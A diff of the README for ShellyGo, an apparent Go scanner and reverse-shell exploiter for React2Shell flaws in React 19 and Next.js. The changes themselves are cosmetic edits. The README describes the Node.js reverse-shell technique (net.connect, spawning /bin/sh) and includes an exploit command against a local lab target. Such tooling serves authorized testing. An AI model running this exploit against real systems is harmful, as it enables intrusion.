@@ -1,14 +1,5 @@
 # ShellyGo
 
-```
-   _____ __         ____       ______
-  / ___// /_  ___  / / /_  __/ ____/___
-  \__ \/ __ \/ _ \/ / / / / / / __/ __ \
- ___/ / / / /  __/ / / /_/ / /_/ / /_/ /
-/____/_/ /_/\___/_/_/\__, /\____/\____/
-                    /____/
-```
-
 A lightweight React2Shell (CVE-2025-55182 & CVE-2025-66478) scanner and exploiter written in pure Go with zero dependencies.
 
 > **DISCLAIMER**: This tool is provided for educational purposes and authorized security testing only. Only use it on systems you own or have explicit written authorization to test. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse.
@@ -33,14 +24,14 @@ React Server Components (RSC) in React 19.0–19.2 / Next.js 15–16 (App Router
 | Mode | Description |
 |------|-------------|
 | `scan` | **Scanner**: sends a safe payload (`console.log(7*7+1)`) to detect if the target is vulnerable without causing damage |
-| `exploit` | **Exploiter**: deploys a pure Node.js reverse shell — starts a local TCP listener, sends the payload, and drops you into an interactive shell |
+| `exploit` | **Exploiter**: deploys a pure Node.js reverse shell, starts a local TCP listener, sends the payload, and drops you into an interactive shell |
 
 ---
 
 ## Requirements
 
 - Go 1.21+ (to build from source)
-- No external dependencies — standard library only
+- No external dependencies: standard library only
 
 ---
 
@@ -94,14 +85,14 @@ ShellyGo                          Target (Next.js)
    │  POST multipart/form-data          │
    │  Header: Next-Action: x            │
    │  Payload: console.log(7*7+1)       │
-   │ ──────────────────────────────────→ │
+   │ ────────────────────────────────── │
    │                                    │
    │         Flight protocol            │
    │     deserializes the payload       │
    │     → Function("console.log(50)")  │
    │                                    │
    │  HTTP 500 + E{"digest"...}         │
-   │ ←────────────────────────────────── │
+   │ ────────────────────────────────── │
    │                                    │
    │  [+] Target seems vulnerable       │
 ```
@@ -117,19 +108,19 @@ ShellyGo                          Target (Next.js)
    │                                    │
    │  2. POST exploit payload           │
    │     (pure Node.js reverse shell)   │
-   │ ──────────────────────────────────→ │
+   │ ────────────────────────────────── │
    │                                    │
    │         Server executes:           │
    │     net.connect(lhost:lport)       │
    │     child_process.spawn('/bin/sh') │
    │                                    │
    │  3. Reverse shell connects back    │
-   │ ←────────────────────────────────── │
+   │ ────────────────────────────────── │
    │                                    │
    │  [+] Interactive shell as www-data │
 ```
 
-The exploit uses a pure Node.js reverse shell (no `bash` or `/dev/tcp` needed) — it works even in minimal containers without a shell.
+The exploit uses a pure Node.js reverse shell (no `bash` or `/dev/tcp` needed), it works even in minimal containers without a shell.
 
 ---
 
@@ -150,10 +141,10 @@ This runs a vulnerable Next.js 15.1.0 + React 19.0.0 application on `http://loca
 ### Test
 
 ```bash
-# Terminal 1 — scan
+# Terminal 1 - scan
 ./shellygo -u http://localhost:3000
 
-# Terminal 2 — exploit (replace with your IP)
+# Terminal 2 - exploit (replace with your IP)
 ./shellygo -u http://localhost:3000 -m exploit -l 172.17.0.1 -p 4444
 ```
 
@@ -161,4 +152,4 @@ This runs a vulnerable Next.js 15.1.0 + React 19.0.0 application on `http://loca
 
 ## License
 
-MIT — see [LICENSE](LICENSE).
+MIT - see [LICENSE](LICENSE).
